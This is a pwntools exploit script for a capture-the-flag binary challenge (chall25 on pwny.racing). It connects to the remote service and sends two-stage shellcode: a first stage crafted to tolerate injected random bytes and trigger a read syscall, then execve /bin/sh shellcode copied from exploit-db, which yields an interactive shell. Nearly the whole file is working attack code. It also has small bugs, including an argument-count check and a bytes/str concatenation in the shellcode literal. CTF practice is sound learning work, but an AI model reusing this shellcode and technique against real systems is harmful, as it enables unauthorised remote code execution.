#!/usr/bin/env python
import sys

from pwn import *

BINARY='../bin/chall25'

HOST = sys.argv[1] if len(sys.argv) > 2 else 'challenge.pwny.racing'
PORT = sys.argv[2] if len(sys.argv) > 2 else 40025

GDB_COMMANDS = ['b *0x555555554b4d']

context.log_level = 'info'
context.binary = ELF(BINARY)
#context.terminal = ['tmux', 'splitw', '-p', '75']
#context.aslr = False

# Open the connection
#io = process(BINARY)
#io = gdb.debug(BINARY, gdbscript='\n'.join(GDB_COMMANDS))
io = remote(HOST, PORT)


# This is the first stage shellcode
# We have 4 blocks with 4 bytes each. The goal is to trigger a read system
# call to read the second stage to the buffer. Therefore, we set rdi, rsi, and
# rdx accordingly. However, to ignore the random bytes inserted by the binary,
# we need to append '\x24'. This results in the opcode '\x24\xXX', which means
# 'and al, 0xXX'. Since rax is zero, this instruction has no effect. The third
# instruction is splitted over two blocks, with a random byte being inserted in
# the middle. This doesn't matter, since this just increases the number of bytes
# read by the read system call, which we trigger immediately afterwards.
code = [
    asm('mov rsi, rdx') + b'\x24',        # 3
    asm('xor rdx, rdx') + b'\x24',        # 3

    asm('mov rdx, 0xff')[:4],             # 7
    b'\0\0' + asm('syscall'),             # 2
]
first_stage = b''.join(code).ljust(16, b'\x90')

# We need the padding since we write to the beginning of the buffer but the
# instruction pointer points somewhere in the middle
padding = b'\x90'*0x18

# This is the shellcode for the second stage (from exploit-db.com)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f' \
        '\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'

payload = first_stage + padding + shellcode

io.sendlineafter('started!', payload)
io.interactive()
